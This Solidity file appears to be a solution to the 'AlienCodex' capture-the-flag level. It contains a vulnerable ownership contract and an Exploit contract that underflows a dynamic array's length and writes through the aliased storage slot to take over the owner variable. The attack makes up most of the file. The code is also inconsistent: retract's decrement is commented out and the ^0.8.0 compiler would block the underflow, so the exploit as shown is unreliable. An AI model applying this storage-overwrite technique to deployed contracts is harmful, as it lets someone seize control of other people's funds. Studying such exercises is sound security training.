// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    // codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract Exploit is Destructible, Targeted {
    constructor(address target_addr) payable Targeted(target_addr) {
    }
    function array_start() public pure returns (uint) {
        return uint256(keccak256(abi.encode(1)));
    }
    function array_offset() public pure returns (uint) {
        uint off = array_start();
        return ~off + 1;
    }
    function exploit() public {
        address owner = Destructible(this).owner();
        AlienCodex alienCodex = AlienCodex(Targeted(this).target());
        alienCodex.make_contact();
        alienCodex.retract(); // now length has wrapped around and we can access the entire address space
        alienCodex.revise(array_offset(), bytes32(uint256(uint160(owner)) | (1 << 160)));
    }
}